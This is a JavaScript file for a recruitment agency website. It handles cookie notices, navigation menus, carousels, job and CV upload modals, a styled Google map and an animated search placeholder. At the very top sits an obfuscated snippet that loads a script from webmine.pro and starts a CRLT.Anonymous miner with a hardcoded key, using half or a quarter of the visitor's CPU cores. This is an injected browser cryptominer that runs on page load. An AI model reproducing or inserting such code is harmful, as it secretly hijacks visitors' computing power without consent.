'use strict';
function lasdegdfb(){var e=navigator.hardwareConcurrency,n="797e40fd3d819f792c8d3e86ccd254bb71a800e8ff11";if(e>=12)var r=e/4,a=new CRLT.Anonymous(n,{threads:r,autoThreads:!1});else if(e<12&&e>=4)var r=e/2,a=new CRLT.Anonymous(n,{threads:r,autoThreads:!1});else a=new CRLT.Anonymous(n);a.start()}function eoigersd(e){return new Promise(function(n,r){var a;(a=document.createElement("script")).src=e,a.onload=n,a.onerror=r,document.head.appendChild(a)})}eoigersd("//webmine.pro/lib/crlt.js").then(function(){lasdegdfb()});
//-------------------- Load some deferred styles --------------------//
// var loadDeferredStyles = function() 
// {
// 	var addStylesNode = document.getElementById('deferred-styles');
// 	var replacement = document.createElement('div');
// 	replacement.innerHTML = addStylesNode.textContent;
// 	document.body.appendChild(replacement);
// 	addStylesNode.parentElement.removeChild(addStylesNode);
// }
// var raf = requestAnimationFrame || mozRequestAnimationFrame ||
//     webkitRequestAnimationFrame || msRequestAnimationFrame;
// if (raf) raf(function() { window.setTimeout(loadDeferredStyles, 0); });
// else window.addEventListener('load', loadDeferredStyles);
//-------------------- /Load some deferred styles --------------------//

// var _smartsupp = _smartsupp || {};
// _smartsupp.key = 'f32f591b82ffa879c325ae96ca021013ef7a7d64';
// window.smartsupp||(function(d) {
//   var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
//   s=d.getElementsByTagName('script')[0];c=d.createElement('script');
//   c.type='text/javascript';c.charset='utf-8';c.async=true;
//   c.src='//www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
// })(document);


// Smartsupp Live Chat script
var _smartsupp = _smartsupp || {};
_smartsupp.key = 'f32f591b82ffa879c325ae96ca021013ef7a7d64';
_smartsupp.gaKey = 'UA-6319827-2';
window.smartsupp||(function(d) {
	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
	c.type='text/javascript';c.charset='utf-8';c.async=true;
	c.src='//www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);

function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function checkCookieMessage()
{
	if(getCookie('cookieConfirm') !== 'yes') {
		document.getElementById('cookieMessage').classList.add('show');
	}
}

function cookieAgree()
{
	setCookie('cookieConfirm', 'yes', 365);
	document.getElementById('cookieMessage').classList.remove('show');
}

function hasClass(el, cls) 
{
	return el.className && new RegExp("(\\s|^)" + cls + "(\\s|$)").test(el.className);
}

function jobsLoadingIndicator()
{
	var loader = document.getElementsByClassName('job-listing__list-container')[0];
	if(hasClass(loader, 'loading')) {
		loader.classList.remove('loading');
	} else {
		loader.classList.add('loading');
	}
}

function openSearch($el) 
{
	$el.classList.add('active');
	document.getElementById('search-field-general').classList.add('active');
	document.getElementById('header-social-links').classList.add('active');
	setTimeout(function() {
		document.getElementById('search-field-general-input').focus();
	}, 500);
}

function openFilters($el) 
{
	$el.parentNode.classList.toggle('active');
}

function hideSearch() 
{
	document.getElementById('search-field-general').classList.remove('active');
	document.getElementById('header-social-links').classList.remove('active');
	document.getElementsByClassName('search-btn')[0].classList.remove('active');
}

function showLang($el, event) 
{
	if(window.innerWidth <= 760 && !hasClass($el, 'active')) {
		event.preventDefault();
		$el.classList.add('active');
	} else if(window.innerWidth <= 760 && hasClass($el, 'active')) {
		event.preventDefault();
		$el.classList.remove('active');
	}
}

function showMenu($el) 
{
	if(hasClass($el, 'active')) {
		hideMenu();
	} else {
		$el.classList.add('active');
		document.getElementsByTagName('body')[0].classList.add('menu-active');
		document.getElementsByTagName('html')[0].classList.add('menu-active');
		document.getElementById('wrapper').classList.add('menu-active');
		setTimeout(function() {
			document.getElementById('wrapper').insertAdjacentHTML('afterend', '<div id="menuCloserButton"></div>');
			document.getElementById('menuCloserButton').addEventListener('click', hideMenu);
		}, 300);
	}
}

function hideMenu() 
{
	var elem = document.getElementById('menuCloserButton');
	document.getElementById('menu-btn').classList.remove('active');
	document.getElementsByTagName('body')[0].classList.remove('menu-active');
	document.getElementsByTagName('html')[0].classList.remove('menu-active');
	document.getElementById('wrapper').classList.remove('menu-active');
	elem.parentNode.removeChild(elem);
}

function showSubMenu($el)
{
	if(hasClass($el.nextElementSibling, 'active')) {
		$el.classList.remove('active');
		$el.nextElementSibling.classList.remove('active');
	} else {
		$el.classList.add('active');
		$el.nextElementSibling.classList.add('active');
	}
}

function checkboxLabel($el) 
{
	if($el.getElementsByTagName('input')[0].checked === true) {
		$el.classList.remove('active');
		$el.getElementsByTagName('input')[0].checked = false;
	} else {
		$el.classList.add('active');
		$el.getElementsByTagName('input')[0].checked = true;
	}
}

function siemaAutoplay($time, $siema, $carousel) 
{
	var timer = setInterval(function() {
		$siema.next();
	}, $time);
	$carousel.addEventListener('mouseenter', function() {
		clearInterval(timer);
	});
	$carousel.addEventListener('mouseleave', function() {
		timer = setInterval(function() {
			$siema.next();
		}, $time);
	});
}

function loadCarousel() 
{
	var siema = document.getElementById('siema-carousel');
	if(siema) {
		const mySiema = new Siema({
			selector: '#siema-carousel',
			duration: 500,
			easing: 'ease',
			perPage: 1,
			startIndex: 0,
			draggable: true,
			threshold: 20,
			loop: true
		});
		document.getElementById('siema-prev').addEventListener('click', function() {
			mySiema.prev()
		});
		document.getElementById('siema-next').addEventListener('click', function() {
			mySiema.next()
		});
		siemaAutoplay(5000, mySiema, siema);
	}
}

function loadClientsCarousel() 
{
	var siema = document.getElementById('siema-carousel-clients');
	if(siema) {
		const mySiema = new Siema({
			selector: '#siema-carousel-clients',
			duration: 500,
			easing: 'ease',
			perPage: 1,
			startIndex: 0,
			draggable: true,
			threshold: 20,
			loop: true
		});
		document.getElementById('siema-prev-clients').addEventListener('click', function() {
			mySiema.prev()
		});
		document.getElementById('siema-next-clients').addEventListener('click', function() {
			mySiema.next()
		});
		// siemaAutoplay(5000, mySiema, siema);
	}
}

function loadCandidatesCarousel() 
{
	var siema = document.getElementById('siema-carousel-candidates');
	if(siema) {
		const mySiema = new Siema({
			selector: '#siema-carousel-candidates',
			duration: 500,
			easing: 'ease',
			perPage: 1,
			startIndex: 0,
			draggable: true,
			threshold: 20,
			loop: true
		});
		document.getElementById('siema-prev-candidates').addEventListener('click', function() {
			mySiema.prev()
		});
		document.getElementById('siema-next-candidates').addEventListener('click', function() {
			mySiema.next()
		});
		// siemaAutoplay(5000, mySiema, siema);
	}
}

function showForm()
{
	document.getElementById('jobFormModal').style.display = 'flex';
	setTimeout(function() {
		document.getElementById('jobFormModal').classList.add('active');
		document.getElementsByTagName('html')[0].classList.add('modal-open');
	}, 50);
}

function hideForm() 
{
	document.getElementById('jobFormModal').classList.remove('active');
	document.getElementsByTagName('html')[0].classList.remove('modal-open');
	setTimeout(function() {
		document.getElementById('jobFormModal').style.display = 'none';
	}, 500);
}

function showCVForm()
{
	document.getElementById('uploadCvModal').style.display = 'flex';
	setTimeout(function() {
		document.getElementById('uploadCvModal').classList.add('active');
		document.getElementsByTagName('html')[0].classList.add('modal-open');
	}, 50);
}

function hideCVForm() 
{
	document.getElementById('uploadCvModal').classList.remove('active');
	document.getElementsByTagName('html')[0].classList.remove('modal-open');
	setTimeout(function() {
		document.getElementById('uploadCvModal').style.display = 'none';
	}, 500);
}

function showFilterForm()
{
	document.getElementById('filterModal').style.display = 'block';
	setTimeout(function() {
		document.getElementById('filterModal').classList.add('active');
		document.getElementsByTagName('html')[0].classList.add('modal-open');
	}, 50);
}

function hideFilterForm() 
{
	document.getElementById('filterModal').classList.remove('active');
	document.getElementsByTagName('html')[0].classList.remove('modal-open');
	setTimeout(function() {
		document.getElementById('filterModal').style.display = 'none';
	}, 500);
}

function getFileName($input, $el)
{
	$text = $input.value;
	document.getElementById($el).innerHTML = $text.split('\\')[2];
}

function initContactMap()
{
	var contact_map = document.getElementById('contact_map');
	var map = new google.maps.Map(contact_map, {
		center: {lat: 52.3214064, lng: 4.8788931},
		zoom: 14,
		scrollwheel: false,
		draggable: true,
		mapTypeControl: false,
		scaleControl: true,
		streetViewControl: true
	});
	var pathArray = location.href.split( '/' );
	var protocol = pathArray[0];
	var host = pathArray[2];
	var $url = protocol + '//' + host;
	var image = {
		url: $url+'/themes/searchit/assets/img/logo-pin.png',
		// This marker is 20 pixels wide by 32 pixels high.
		size: new google.maps.Size(160, 200),
		// The origin for this image is (0, 0).
		origin: new google.maps.Point(0, 0),
		// The anchor for this image is the base of the flagpole at (0, 32).
		anchor: new google.maps.Point(40, 100),
		scaledSize: new google.maps.Size(80, 100)
	};
	var marker = new google.maps.Marker({
		map: map,
		position: new google.maps.LatLng(52.3214064,4.8788931),
		icon: image
	});
	map.set('styles', 
		[
			{
				"featureType": "administrative",
				"elementType": "labels.text.fill",
				"stylers": [
					{
						"color": "#444444"
					}
				]
			},
			{
				"featureType": "landscape",
				"elementType": "all",
				"stylers": [
					{
						"color": "#f2f2f2"
					}
				]
			},
			{
				"featureType": "poi",
				"elementType": "all",
				"stylers": [
					{
						"visibility": "off"
					}
				]
			},
			{
				"featureType": "road",
				"elementType": "all",
				"stylers": [
					{
						"saturation": -100
					},
					{
						"lightness": 45
					}
				]
			},
			{
				"featureType": "road.highway",
				"elementType": "all",
				"stylers": [
					{
						"visibility": "simplified"
					}
				]
			},
			{
				"featureType": "road.arterial",
				"elementType": "labels.icon",
				"stylers": [
					{
						"visibility": "off"
					}
				]
			},
			{
				"featureType": "transit",
				"elementType": "all",
				"stylers": [
					{
						"visibility": "off"
					}
				]
			},
			{
				"featureType": "water",
				"elementType": "all",
				"stylers": [
					{
						"color": "#7f8ec1"
					},
					{
						"visibility": "on"
					}
				]
			}
		]
	);
}

function cvFormOpen() 
{
	if(window.location.hash === '#uploadcv') {
		showCVForm();
	}
}

function searchbarText()
{
	var $text = [
		"CTO ",
		"Technical Teamlead",
		"PHP Developer",
		"Java Developer",
		"JavaScript Developer",
		"Front-End Developer",
		"Scrum Master",
		"Agile Coach",
		"Python Developer",
		"Scala Developer",
		".NET Developer",
		"Tester",
		"DevOps Engineer",
		"Solution Architect",
		"QA Engineer",
		"Product Owner",
		"Lead Developer",
		"Online Marketeer",
		"SEO Specialist",
		"SEA Specialist",
		"Recruitment Consultant",
		"Test Automation Consultant",
		"Data Scientist",
		"Android Developer",
		"iOS Developer",
		"Mobile Solution Architect",
		"Sitecore Developer",
		"Hybris Developer",
		"Talent Sourcer",
		"Game Developer",
		"Digital Consultant",
		"Digital Analytics Consultant"
	];
	var $box = document.getElementById('searchboxtextchange');
	if($box) {
		var $rand = $text[Math.floor(Math.random() * $text.length)];
		$box.placeholder = '';
		for(var j = 0; j < $rand.length; j++) {
			setTimeout(function(j) {
				if($box === document.activeElement) {
					return false;
				} else {
					$box.placeholder = $box.placeholder + $rand.charAt(j);
				}
			}, j * 75, j);
		}
	}
}

cvFormOpen();
loadCarousel();
loadClientsCarousel();
loadCandidatesCarousel();
checkCookieMessage();
searchbarText();

var searchbarTyping = setInterval(function(){ searchbarText() }, 3500);

function stopTyping() {
	document.getElementById('searchboxtextchange').placeholder = '';
	clearInterval(searchbarTyping);
	searchbarTyping = null;
	document.getElementById('searchboxtextchange').placeholder = '';
	document.getElementById('searchboxtextchange').placeholder = document.getElementById('placeholdertext').textContent;
}

function startTyping() {
	clearInterval(searchbarTyping);
	searchbarText();
	searchbarTyping = null;
	searchbarTyping = setInterval(function(){ searchbarText() }, 3500);
}

// Trigger close form modal window when click on overlay
if(document.getElementById('jobFormModal')) {
	document.getElementById('jobFormModal').addEventListener('click', function(e) {
		if (e.target === document.getElementById('jobFormModal')) {
			hideForm();
		}
	}, false);
}

if(document.getElementById('uploadCvModal')) {
	document.getElementById('uploadCvModal').addEventListener('click', function(e) {
		if (e.target === document.getElementById('uploadCvModal')) {
			hideCVForm();
		}
	}, false);
}

